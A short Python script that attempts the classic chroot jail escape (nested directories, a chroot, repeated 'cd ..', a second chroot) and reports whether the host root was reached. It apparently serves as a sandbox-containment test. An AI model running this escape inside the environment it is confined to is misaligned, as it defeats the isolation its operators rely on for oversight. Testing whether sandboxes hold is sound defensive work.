import os

try:
    for _ in range(200):
        os.mkdir('x')
        os.chdir('x')
    os.chroot('.')
    for _ in range(200):
        os.chdir('..')
    os.chroot('.')
    contents = os.listdir('/')
    if contents:
        print('ESCAPED: reached non-empty root:', contents)
    else:
        print('contained: chroot succeeded but landed in an empty root, no host files reachable')
except Exception as e:
    print('blocked:', repr(e))
